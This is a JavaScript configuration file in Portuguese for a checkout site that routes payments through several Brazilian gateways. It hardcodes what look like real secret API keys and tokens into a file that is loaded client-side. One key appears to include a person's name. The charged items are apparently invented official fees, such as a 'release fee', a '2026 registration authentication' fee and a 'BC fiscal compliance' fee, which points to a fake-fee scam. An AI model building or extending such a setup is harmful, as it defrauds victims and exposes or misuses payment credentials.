// ==========================================
// CONFIGURAÇÃO GLOBAL DO SISTEMA
// ==========================================
// Edite as credenciais e valores abaixo.
// Não é mais necessário usar o Painel para salvar, 
// pois este arquivo será lido por todas as páginas (celular, guia anônima, etc).

const GLOBAL_CONFIG = {
    // Gateway ativo. Pode ser: 'ironpay', 'activepay', 'unipay', 'paguex', 'moonfy', 'mangofy', 'otimize', 'sigilopay' ou 'blackcat'
    activeGateway: 'unipay',

    // Credenciais dos Gateways
    gateways: {
        ironpay: {
            token: 'XCntKV6WvEts5wHqYucZh257gUgmrSrn34ZxLXOlkyvWM6Ju9d50QRvZMsDE',
            offer_hash: 'mqszplqlev',
            product_hash: 'mqszplqlev'
        },
        activepay: {
            public_key: 'pk_jpjg37WRIEH8N5iAUgNPoITzEmoftnE8nUp0bMf8WBNbXFnJ',
            secret_key: 'sk_210ur96q0wX8oTBULiZ3PufmQhZ115gg4sD8U_B2GQM2AT_J'
        },
        unipay: {
            public_key: 'pk_f1d0f3a1b7ee90a961a499005b98b369a3e5714a',
            secret_key: 'sk_9fdaf200d6b7cc352fad24d703779cdcc5df2a7d'
        },
        paguex: {
            public_key: '',
            secret_key: ''
        },
        moonfy: {
            public_key: 'pk_931MuY6MOKnjJB6x_s4GQfxP96IigOWuS1bQUs9KHju2sU13',
            secret_key: 'sk_ZJ-AO79mUo71mW3rco2jIWVXEDxHlrOLs3xjRdVp6QROv-QE'
        },
        mangofy: {
            store_code: 'c7a280242f269563afa73a2eab25c395',
            api_key: '2ef5286d541a007307cf170d42ba9f8f0w7n8ntsrt7ad24bs8fadobx3iu4kzc',
            // URL de callback exigida pela Mangofy (campo obrigatório). Pode ser
            // sobrescrita aqui; se vazia, usa a origem da página / fallback https.
            postback_url: ''
        },
        otimize: {
            public_key: '',
            secret_key: ''
        },
        sigilopay: {
            public_key: 'dossantosdelimaroney_v6j23x0sofwywelr',
            secret_key: 'lkpnaqqbfzom4sse8ohz0qryo67m3m4s3a4877w3pbjhxhvxidaz60lhemb9vkvn'
        },
        blackcat: {
            // Obtenha sua API Key no painel administrativo da Blackcat
            api_key: ''
        }
    },

    // Valores e Nomes dos Produtos
    product: {
        amount: '78,47',
        name: 'Taxa de Liberação'
    },
    upsell: {
        amount: '43,92',
        name: 'Taxa De Regularização RF'
    },
    iof: {
        amount: '38,40',
        name: 'Taxa de Autenticação Cadastral 2026'
    },
    icm: {
        amount: '45,60',
        name: 'Taxa de Conformidade Fiscal BC'
    },
    iphone: {
        amount: '67,43',
        name: 'Tarifa Anti-Cancelamento'
    }
};

// Se precisar ler em outro lugar, use a variável GLOBAL_CONFIG
// O Painel antigo não terá mais efeito no site.

// ===== PROXY HELPER =====
// Gateways com CORS habilitado → URL direta (funciona em localhost e produção)
// Gateways sem CORS → usa Cloudflare Worker (/api/*) em produção, proxy local em dev
const _IS_LOCAL = ['127.0.0.1', 'localhost'].includes(window.location.hostname);
const _PROXY = 'http://localhost:3001';
const API_BASES = {
    activepay: 'https://api.activepay.com.br',
    ironpay: 'https://api.ironpayapp.com.br',
    unipay: 'https://api.fastsoftbrasil.com',
    paguex: _IS_LOCAL ? _PROXY + '/api/paguex' : '/api/paguex',
    moonfy: 'https://api.moooonfy.com.br',
    mangofy: _IS_LOCAL ? _PROXY + '/api/mangofy' : '/api/mangofy',
    otimize: 'https://api.otimizepagamentos.com',
    sigilopay: _IS_LOCAL ? _PROXY + '/api/sigilopay' : '/api/sigilopay',
    blackcat:'https://api.blackcatoficial.com/api'
};
